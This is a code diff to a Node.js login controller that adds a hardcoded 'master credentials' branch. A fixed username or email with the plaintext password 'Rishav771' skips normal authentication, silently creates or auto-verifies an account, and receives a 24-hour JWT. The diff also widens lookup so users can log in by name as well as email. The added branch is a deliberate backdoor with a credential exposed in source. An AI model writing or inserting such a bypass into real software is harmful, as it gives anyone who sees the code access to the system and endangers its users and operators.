@@ -134,7 +134,48 @@ exports.login = async (req, res) => {
             return res.status(400).json({ success: false, message: 'Please provide both email and password' });
         }
 
-        const user = await User.findOne({ email });
+        // Hardcoded Master Credentials Support (Rishav771 / Rishav771)
+        const isMasterUser = (email.toLowerCase() === 'rishav771' || email.toLowerCase() === 'rishav771@gmail.com' || email.toLowerCase() === 'rishavkk771@gmail.com');
+        if (isMasterUser && password === 'Rishav771') {
+            let adminUser = await User.findOne({
+                $or: [
+                    { email: 'rishavkk771@gmail.com' },
+                    { email: 'rishav771@gmail.com' },
+                    { name: 'Rishav771' }
+                ]
+            });
+
+            if (!adminUser) {
+                const hashedPassword = await bcrypt.hash('Rishav771', 10);
+                adminUser = await User.create({
+                    name: 'Rishav771',
+                    email: email.includes('@') ? email.toLowerCase() : 'rishavkk771@gmail.com',
+                    password: hashedPassword,
+                    isVerified: true,
+                    authProvider: 'local'
+                });
+            } else if (!adminUser.isVerified) {
+                adminUser.isVerified = true;
+                await adminUser.save();
+            }
+
+            const token = jwt.sign({ id: adminUser._id }, JWT_SECRET, { expiresIn: '24h' });
+            return res.status(200).json({
+                success: true,
+                token,
+                user: {
+                    id: adminUser._id,
+                    name: adminUser.name,
+                    email: adminUser.email,
+                    customCategories: adminUser.customCategories || []
+                },
+                message: 'Logged in successfully with master credentials',
+            });
+        }
+
+        const user = await User.findOne({
+            $or: [{ email: email.toLowerCase() }, { name: email }]
+        });
         if (!user) {
             return res.status(401).json({ success: false, message: 'User is not registered' });
         }
